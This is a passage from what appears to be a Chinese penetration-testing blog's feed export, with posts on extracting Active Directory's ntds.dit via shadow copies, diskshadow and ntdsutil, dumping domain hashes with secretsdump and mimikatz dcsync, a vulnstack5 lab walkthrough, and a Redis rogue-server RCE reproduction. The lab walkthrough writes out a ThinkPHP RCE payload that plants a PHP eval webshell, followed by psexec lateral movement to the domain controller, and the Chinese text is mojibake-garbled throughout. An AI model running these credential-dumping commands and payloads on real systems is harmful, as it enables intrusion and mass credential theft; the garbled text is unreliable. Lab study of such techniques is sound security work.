<h5 id="åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´"><a href="#åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´" class="headerlink" title="åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´"></a>åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´</h5><p><code>vssadmin delete shadows /for=c:  /quiet</code></p>
<p><img src="/posts/77c245ea/vssadmin.png"></p>
<br>

<h4 id="åˆ©ç”¨vssown-vbs-è„šæœ¬æå–nods-dit"><a href="#åˆ©ç”¨vssown-vbs-è„šæœ¬æå–nods-dit" class="headerlink" title="åˆ©ç”¨vssown.vbs è„šæœ¬æå–nods.dit"></a>åˆ©ç”¨vssown.vbs è„šæœ¬æå–nods.dit</h4><p>ä¸‹è½½åœ°å€ï¼š<code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></p>
<p>vssown.vbsåŠŸèƒ½ä¸vssadminç±»ä¼¼ï¼Œæœ¬è´¨æ˜¯é€šè¿‡wmiå¯¹shadowCoptè¿›è¡Œæ“ä½œï¼Œå¯ç”¨äºåˆ›å»ºå’Œåˆ é™¤å·å½±æ‹·è´ï¼Œä»¥åŠå¯åŠ¨å’Œåœæ­¢å·å½±æ‹·è´æœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;å¯åŠ¨å·å½±æ‹·è´æœåŠ¡</span><br><span class="line">cscript vssown.vbs &#x2F;start</span><br><span class="line">&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´</span><br><span class="line">cscript vssown.vbs &#x2F;create c</span><br><span class="line">&#x2F;&#x2F;åˆ—å‡ºå½“å‰å·å½±æ‹·è´</span><br><span class="line">cscript vssown.vbs &#x2F;list</span><br><span class="line">&#x2F;&#x2F;å¤åˆ¶ntds.ditåˆ°æ¡Œé¢</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</span><br><span class="line">&#x2F;&#x2F;åˆ é™¤å·å½±æ‹·è´</span><br><span class="line">cscript vssown.vbs &#x2F;delete &#123;GUID&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/vssown.png"></p>
<h4 id="ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds-dit"><a href="#ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds-dit" class="headerlink" title="ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds.dit"></a>ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds.dit</h4><p>å°†ntds.ditå¤åˆ¶åˆ°<code>C:\test\Active Directory\ </code>æ–‡ä»¶å¤¹ä¸­</p>
<p>ä½¿ç”¨ç®¡ç†å‘˜æ¨¡å¼æ‰“å¼€cmdè¾“å…¥å¦‚ä¸‹</p>
<p><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:/test&quot; q  q</code></p>
<p><img src="/posts/77c245ea/ntdsutil_IFM.png"></p>
<p>ç„¶åè®¿é—®cç›˜ å¯ä»¥çœ‹åˆ°åˆ›å»ºäº†ä¸€ä¸ªtestç›®å½•  </p>
<p>testç›®å½•ä¸‹æœ‰ä¿©ä¸ªæ–‡ä»¶ åˆ†åˆ«ä¸º <code>Active Directory</code>  å’Œ <code>registry</code></p>
<p><code>registry</code>ä¸‹åŒ…å« <code>SYSTEM</code> å’Œ <code>SECURITY</code></p>
<p><code>Active Directory</code>ä¸‹åŒ…å« <code>ntds.dit</code></p>
<p><img src="/posts/77c245ea/test_file.png"></p>
<p>ç„¶åå°†ä»¥ä¸Šå†…å®¹å¤åˆ¶åˆ°æ¡Œé¢</p>
<p>è¿™é‡Œé€‰æ‹©ä½¿ç”¨<code>Copy-VSS.ps1</code></p>
<p>ä¸‹è½½åœ°å€ï¼š<code>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</code></p>
<p>è¿›å…¥powershell </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Executionpolicy bypass</span><br><span class="line">Import-Module .\Copy-VSS.ps1  &#x2F;&#x2F;å¯¼å…¥è„šæœ¬</span><br><span class="line">copy-vss    &#x2F;&#x2F;æ‰§è¡Œè„šæœ¬</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/copy_vss.png"></p>
<br>

<h4 id="ä½¿ç”¨diskshadowå¯¼å‡ºntds-dit"><a href="#ä½¿ç”¨diskshadowå¯¼å‡ºntds-dit" class="headerlink" title="ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit"></a>ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit</h4><p><code>Diskshadow.exe</code>ä½¿ç”¨å·å½±æ‹·è´æœåŠ¡ï¼ˆVSSï¼‰æ‰€æä¾›çš„å¤šä¸ªåŠŸèƒ½ã€‚é»˜è®¤é…ç½®ä¸‹ï¼ŒDiskshadow.exeä½¿ç”¨äº†ä¸€ç§äº¤äº’å¼çš„å‘½ä»¤è§£é‡Šå™¨,è¿™é‡Œè·ŸDiskRaidæˆ–è€…DiskPartæ¯”è¾ƒç±»ä¼¼ã€‚å› ä¸ºdiskshadowçš„ä»£ç æ˜¯ç”±å¾®è½¯ç­¾åçš„ï¼Œè€Œä¸”<code>Windows Server2008ã€Windows Server2012ã€Windows Server2016éƒ½é»˜è®¤åŒ…å«diskshadow</code>ã€‚æ‰€ä»¥ï¼Œdiskshadowä¹Ÿå¯ä»¥ç”¨æ¥æ“ä½œå·å½±æ‹·è´æœåŠ¡å¹¶å¯¼å‡ºntds.ditã€‚diskshadowçš„åŠŸèƒ½ä¸vshadowç±»ä¼¼ï¼Œä¸”åŒæ ·ä½äº<code>C:\windows\system32\ </code>ç›®å½•ä¸‹.</p>
<p>ç”±äºæ˜¯å¾®è½¯å®˜æ–¹çš„å·¥å…·ï¼Œæ‰€ä»¥ä¸ä¼šè¢«æ€</p>
<p>æŸ¥çœ‹<code>diskshadow.exe</code> çš„å¸®åŠ©ä¿¡æ¯</p>
<p><code>diskshdow /?</code></p>
<p>ä¸€èˆ¬å…ˆåœ¨Cç›˜å†™å…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ å­˜å‚¨ä¸ºcommand.txt</p>
<p><code>echo &quot;exec c:\windows\system32\calc.exe&quot;  &gt;command.txt</code></p>
<p>ä½†æ˜¯è¿™æ ·ç”Ÿæˆçš„commod.txtä¼šå­˜åœ¨åŒå¼•å· è¿™æ ·æ‰§è¡Œdiskshadowå‘½ä»¤çš„è¯ ä¼šæ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œæ‰€ä»¥æœ€å¥½åœ¨æ‰§è¡Œdiskshadowå‘½ä»¤å‰å…ˆçœ‹ä¸‹command.txt æ˜¯å¦æ­£ç¡®</p>
<p><code>type c:\command.txt</code></p>
<p><code>diskshadow /s c:\command</code> </p>
<p>ç„¶åä¼šå¼¹å‡ºä¹‹å‰å†™çš„calc</p>
<p><img src="/posts/77c245ea/diskshadow_calc.png"></p>
<p>ä½¿ç”¨<code>diskshadow.exe</code>å¯¼å‡º<code>ntds.dit</code> å°†å‘½ä»¤å†™å…¥æ–‡æœ¬æ–‡ä»¶ä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;è®¾ç½®å·å½±æ‹·è´</span><br><span class="line">set context persistent nowriters</span><br><span class="line">&#x2F;&#x2F;æ·»åŠ å·</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">&#x2F;&#x2F;åˆ›å»ºå¿«ç…§</span><br><span class="line">create</span><br><span class="line">&#x2F;&#x2F;åˆ†é…è™šæ‹Ÿç£ç›˜ç›˜ç¬¦</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">&#x2F;&#x2F;å°†ntds.ditå¤åˆ¶åˆ°Cç›˜ä¸­</span><br><span class="line">exec &quot;cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\</span><br><span class="line">&#x2F;&#x2F;åˆ é™¤æ‰€æœ‰å¿«ç…§</span><br><span class="line">delete shadows all</span><br><span class="line">&#x2F;&#x2F;åˆ—å‡ºç³»ç»Ÿä¸­çš„å·å½±æ‹·è´</span><br><span class="line">list shadows all</span><br><span class="line">&#x2F;&#x2F;é‡ç½®</span><br><span class="line">reset</span><br><span class="line">&#x2F;&#x2F;é€€å‡º</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨<code>diskshadow.exe</code>åŠ è½½è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶</p>
<p><code>diskshadow /s c:\2.txt</code></p>
<p>åœ¨æ‰§è¡Œè¿™æ¡å‘½ä»¤æ—¶ è¦åœ¨system32ä¸‹æ‰§è¡Œï¼Œå¦åˆ™å¯èƒ½ä¼šæŠ¥é”™</p>
<p><img src="/posts/77c245ea/diskshadow_2.png"></p>
<p>å¯¼å‡ºntds.ditåï¼Œå¯ä»¥å°†system.hiveè½¬å‚¨ã€‚å› ä¸ºsystem.hiveä¸­å­˜æ”¾ç€ntds.ditçš„å¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰è¯¥å¯†é’¥ï¼Œå°†æ— æ³•æŸ¥çœ‹ntds.ditä¸­çš„ä¿¡æ¯</p>
<p>å¯ä»¥ä½¿ç”¨Copy-VSS.ps1ç­‰æ–¹æ³•å¯¼å‡ºSYSTEMæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†å¯¼å‡ºsystem</p>
<p><code>reg save hklm\system C:\Users\Administrator\Desktop\system.hive</code></p>
<p><img src="/posts/77c245ea/reg_system.png"></p>
<br>

<h3 id="è§£æntds-dit"><a href="#è§£æntds-dit" class="headerlink" title="è§£æntds.dit"></a>è§£æntds.dit</h3><h4 id="ä½¿ç”¨impacket-secretsdumpè§£æntds-dit"><a href="#ä½¿ç”¨impacket-secretsdumpè§£æntds-dit" class="headerlink" title="ä½¿ç”¨impacket secretsdumpè§£æntds.dit"></a>ä½¿ç”¨impacket secretsdumpè§£æntds.dit</h4><p><code>secretsdump.exe -system SYSTEM.hive -ntds ntds.dit LOCAL</code></p>
<p>ç„¶åå¯ä»¥çœ‹åˆ°æ‰€æœ‰ç”¨æˆ·çš„hashå€¼</p>
<p><img src="/posts/77c245ea/secretsdump_ntds.png"></p>
<h4 id="åˆ©ç”¨dcsync-è·å–åŸŸæ•£åˆ—å€¼"><a href="#åˆ©ç”¨dcsync-è·å–åŸŸæ•£åˆ—å€¼" class="headerlink" title="åˆ©ç”¨dcsync è·å–åŸŸæ•£åˆ—å€¼"></a>åˆ©ç”¨dcsync è·å–åŸŸæ•£åˆ—å€¼</h4><h5 id="åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash"><a href="#åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash" class="headerlink" title="åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash"></a>åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash</h5><p>å¯ä»¥åˆ©ç”¨dcsyncè·å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync &#x2F;domain:mamor.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/mimikatz_dcsync.png"></p>
<p>ä¹Ÿå¯ä»¥å¯¼å‡ºæŒ‡å®šç”¨æˆ·çš„hashå€¼</p>
<p><code>lsadump::dcsync /domain:mamor.com /user:Mamor</code></p>
<p><img src="/posts/77c245ea/dcsync_user.png"></p>
<p>é€šè¿‡è½¬å‚¨lsass.exe è¿›ç¨‹å¯¹hashå€¼è¿›è¡Œdump</p>
<p><code>lsadump::lsa  /inject</code></p>
<p>è¿™æ ·å¯ä»¥å¯¼å‡ºæ‰€æœ‰è´¦æˆ·å’ŒåŸŸæ•£åˆ—å€¼</p>
<p><img src="/posts/77c245ea/mimikatz_lsa1.png"></p>
<p><img src="/posts/77c245ea/mimikatz_lsa2.png"></p>
<h5 id="ä½¿ç”¨powershell-Invoke-DCSync-ps1è„šæœ¬"><a href="#ä½¿ç”¨powershell-Invoke-DCSync-ps1è„šæœ¬" class="headerlink" title="ä½¿ç”¨powershell Invoke-DCSync.ps1è„šæœ¬"></a>ä½¿ç”¨powershell Invoke-DCSync.ps1è„šæœ¬</h5><p>ä¸‹è½½åœ°å€ï¼š<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
<p>è¯¥è„šæœ¬å¯ä»¥åˆ©ç”¨dcsync ç›´æ¥è¯»å–ntds.dit ä»¥è·å¾—åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    &#x2F;&#x2F; å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      &#x2F;&#x2F; å¯¼å‡ºåŸŸå†…administratorè´¦æˆ·çš„hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/ps_invoke-DCSync.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/">https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/</a></p>
<p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1731472">https://cloud.tencent.com/developer/article/1731472</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack5é¶åœº</title>
    <url>/posts/4f399e45/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><blockquote>
<p>2008     192.168.138.138(å†…ç½‘)             sun\admin 2021.com</p>
<p>win7     192.168.138.136(å†…ç½‘)            192.168.135.150(å¤–ç½‘)</p>
<p>sun\leo123.com    sun\Administrator dc123.com</p>
<p>å¯åŠ¨phpstudy</p>
<p>kali        192.168.135.128(å¤–ç½‘)</p>
</blockquote>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>sudo nmap -sV 192.168.135.150 </code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.135.150</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 991 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80&#x2F;tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.5.38)</span><br><span class="line">135&#x2F;tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306&#x2F;tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B5:F4:E9 (VMware)</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>å¼€æ”¾äº†80ï¼Œ3306 ç³»ç»Ÿä¸ºWin7</p>
<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p><code>dirmap -i 192.168.135.150 -lcf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Load targets from: 192.168.135.150</span><br><span class="line">[+] Set the number of thread: 30</span><br><span class="line">[+] Coroutine mode</span><br><span class="line">[+] Current target: http:&#x2F;&#x2F;192.168.135.150&#x2F;                                                 </span><br><span class="line">[*] Launching auto check 404</span><br><span class="line">[+] Checking with: http:&#x2F;&#x2F;192.168.135.150&#x2F;hsnwdxgvjhcohdgnyqwwyagtdjaanxwsamkblggcfg</span><br><span class="line">[*] Use recursive scan: No                                                                  </span><br><span class="line">[*] Use dict mode</span><br><span class="line">[+] Load dict:&#x2F;home&#x2F;kali&#x2F;Tools&#x2F;dirmap&#x2F;data&#x2F;dict_mode_dict.txt</span><br><span class="line">[*] Use crawl mode</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;0                           </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.60kb] http:&#x2F;&#x2F;192.168.135.150&#x2F;add.php                      </span><br><span class="line">[200][image&#x2F;x-icon][1.12kb] http:&#x2F;&#x2F;192.168.135.150&#x2F;favicon.ico                              </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;Index                        </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index                        </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index.html                   </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index.php                    </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;INDEX.PHP                    </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][931.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;index.PHP                    </span><br><span class="line">[200][text&#x2F;plain][24.00b] http:&#x2F;&#x2F;192.168.135.150&#x2F;robots.txt    </span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æŠ¥é”™é¡µé¢å¯ä»¥å‘ç°ä¸ºthinkphp V5.0.22</p>
<p>æ‰«åˆ°ä¸€ä¸ªå¤§é©¬  <code>http://192.168.135.150/add.php</code> ä½†æ˜¯ä¸çŸ¥é“å¯†ç å¤šå°‘</p>
<p><img src="/posts/4f399e45/dama.png"></p>
<h3 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h3><p>è®¿é—®80ç«¯å£ ç‰ˆæœ¬ä¸º thinkphp  V5.0.22</p>
<p>POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># whoami</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line"># phpinfo</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"># pwd</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;powershell%20pwd</span><br><span class="line"># å†™ä¸€å¥è¯</span><br><span class="line"># å¦‚æœæ˜¯linuxä½¿ç”¨echoå†™å…¥æ–‡ä»¶ å¦‚æœæ˜¯winä½¿ç”¨file_put_contentså†™å…¥</span><br><span class="line"># ?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;echo%20^%3C?php%20@eval($_GET[%22pass%22])?^%3E%3Eshell.php</span><br><span class="line"># ?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;%3C%3Fphp%20eval(%24_POST%5B&#39;pass&#39;%5D)%3B%3F%3E</span><br><span class="line">http:&#x2F;&#x2F;192.168.135.150&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;%3C%3Fphp%20eval(%24_POST[%27shell%27])%3B%3F%3E</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨èšå‰‘è¿æ¥ </p>
<p><img src="/posts/4f399e45/ant_shell.png"></p>
<p>å‘ç°æ˜¯adminæƒé™</p>
<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><p>ä¸Šçº¿CS ä¸ºadministratoræƒé™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¿¡æ¯æ•´ç†</span><br><span class="line">win7</span><br><span class="line">ip 192.168.138.136(å†…ç½‘)  192.168.135.150(å¤–ç½‘)   DCip 192.168.138.138</span><br><span class="line">åŸŸ sun.com</span><br><span class="line">è¡¥ä¸      [01]: KB2534111</span><br><span class="line">          [02]: KB2999226</span><br><span class="line">          [03]: KB976902</span><br><span class="line">http:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›è¡Œææƒï¼Œä½†è¿™é‡Œä½¿ç”¨ms15-051 å’Œ ms14-058éƒ½æ²¡æˆåŠŸ</p>
<p>ä½¿ç”¨CS run mimikatz  è¯»å–åˆ°äº†Administrator å’Œ leo çš„å¯†ç </p>
<p><img src="/posts/4f399e45/logonpassword.png"></p>
<p>æ‰«æä¸€ä¸‹å†…ç½‘ä¸­çš„ä¸»æœº 445 </p>
<p><code>portscan 192.168.138.0/24 445 arp 50</code></p>
<p>å°è¯•ä½¿ç”¨æŠ“åˆ°çš„leoç”¨æˆ· è¿›è¡Œpsexec</p>
<p><img src="/posts/4f399e45/psexec_win_system.png"></p>
<p>å¾—åˆ°win7 systemæƒé™</p>
<p>ç”±äºDCä¸å‡ºç½‘ä½¿ç”¨win7ä½œä¸ºè·³æ¿æœºå»ºç«‹Listener </p>
<p><img src="/posts/4f399e45/neiwang1.png"></p>
<p><img src="/posts/4f399e45/neiwang2.png"></p>
<p>ç„¶åé€šè¿‡psexec ä¸Šçº¿DC å¾—åˆ°DCæœºå™¨çš„systemå…¨æ¯</p>
<p><img src="/posts/4f399e45/dc_psexec1.png"></p>
<p><img src="/posts/4f399e45/dc_psexec2.png"></p>
<p><img src="/posts/4f399e45/dc_system.png"></p>
<p><img src="/posts/4f399e45/tuopu.png"></p>
<p>run mimikatz çœ‹ä¸‹dcæœºå™¨çš„å¯†ç </p>
<p><img src="/posts/4f399e45/dc_passwd.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>redisRCEå¤ç°</title>
    <url>/posts/27814dfe/</url>
    <content><![CDATA[<h3 id="redis4-x-5-x-RCE"><a href="#redis4-x-5-x-RCE" class="headerlink" title="redis4.x/5.x RCE"></a>redis4.x/5.x RCE</h3><h4 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p>4.x-5.x</p>
<h4 id="ä¸»ä»æ¨¡å¼"><a href="#ä¸»ä»æ¨¡å¼" class="headerlink" title="ä¸»ä»æ¨¡å¼"></a>ä¸»ä»æ¨¡å¼</h4><p>ä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚</p>
<h4 id="redisæ¨¡å—"><a href="#redisæ¨¡å—" class="headerlink" title="redisæ¨¡å—"></a>redisæ¨¡å—</h4><p>åœ¨Reids 4.xä¹‹åï¼ŒRedisæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œé€šè¿‡å†™cè¯­è¨€å¹¶ç¼–è¯‘å‡º.soæ–‡ä»¶ã€‚</p>
<h4 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h4><p>åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä¸‹è½½redis</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># æ›´æ”¹é…ç½®æ–‡ä»¶</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes æ”¹ä¸ºprotected-mode no</span><br><span class="line">      bind 127.0.0.1 æ”¹ä¸º bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨redis</span><br><span class="line">cd src</span><br><span class="line">.&#x2F;redis-server ..&#x2F;redis.conf   # åŠ è½½æŒ‡å®šé…ç½®</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç«å¢™</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>expä¸‹è½½ <code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
<p>ç”¨æ³•:<code>python3 redis-rogue-server.py --rhost=192.168.0.182 --lhost=192.168.0.128 --exp=exp.so</code></p>
<p>-r åå¼¹shell  -i å®æ—¶shell</p>
<p><img src="/posts/27814dfe/exp_i.png"></p>
<p><img src="/posts/27814dfe/exp.png"></p>
<p><img src="/posts/27814dfe/shell.png"></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>
<p><a href="http://www.feidao.site/wordpress/?p=2090">http://www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://blog.csdn.net/weixin_43252204/article/details/115181128">https://blog.csdn.net/weixin_43252204/article/details/115181128</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°</title>
